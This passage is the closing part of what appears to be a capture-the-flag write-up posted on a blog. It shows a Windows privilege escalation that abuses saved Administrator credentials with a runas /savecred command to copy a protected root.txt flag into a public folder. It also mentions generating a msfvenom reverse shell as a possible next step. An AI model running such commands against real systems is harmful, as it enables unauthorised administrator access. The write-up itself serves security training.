+</code></pre></div><p>It&rsquo;s a bit difficult to read, but it looks like the shortcut runs a program as the <code>Administrator</code> using saved credentials. We can use that.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\Public\Desktop&gt;runas /user<span style=color:#960050;background-color:#1e0010>:</span>Administrator /savecred <span style=color:#e6db74>&#34;cmd.exe /c more C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\Public\Desktop\output.txt&#34;</span>
+</code></pre></div><p>Did it work?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\Public\Desktop&gt;more output.txt
+&lt;SNIP&gt;
+</code></pre></div><p>Yes! From there we could generate a reverse shell using <code>msfvenom</code> and run that as <code>Administrator</code>, but I&rsquo;ve got the flag so I&rsquo;ll leave it there for now.</p></div><div id=disqus_thread></div></div><script type=text/javascript>var disqus_shortname="jamiemagee";(function(){var a=document.createElement('script');a.async=!0,a.type='text/javascript',a.src='//'+disqus_shortname+'.disqus.com/count.js',(document.getElementsByTagName('HEAD')[0]||document.getElementsByTagName('BODY')[0]).appendChild(a)})()</script><script type=text/javascript>var disqus_shortname="jamiemagee";(function(){var a=document.createElement('script');a.type='text/javascript',a.async=!0,a.src='//'+disqus_shortname+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=http://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+<script src=/js/highlight.pack.js></script><script>hljs.initHighlightingOnLoad()</script><script src=/js/cms.js></script></body></html>
